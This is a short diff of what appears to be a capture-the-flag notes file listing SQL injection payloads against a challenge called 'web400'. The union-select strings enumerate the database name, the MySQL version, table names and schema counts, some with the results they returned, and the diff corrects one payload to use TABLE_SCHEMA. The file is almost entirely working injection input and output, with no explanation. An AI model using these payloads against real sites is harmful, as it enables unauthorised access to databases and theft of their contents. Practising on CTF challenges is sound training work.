@@ -4,7 +4,7 @@
 ' or (1) union select database() from information_schema.tables#      web400
 admin' or (1) union select version() from information_schema.tables#          5.7.17-0ubuntu0.16.04.2
 -- ' or (1) union select passwd() from information_schema.tables# 
-' or (1) union select 1,2,group_concat(table_name) from information_schema.tables where schema_name='web400'
+' or (1) union select 1,2,group_concat(table_name) from information_schema.tables where TABLE_SCHEMA='web400'
 
 ' or (1) union SELECT COUNT(*) FROM information_schema.SCHEMATA#          5
 
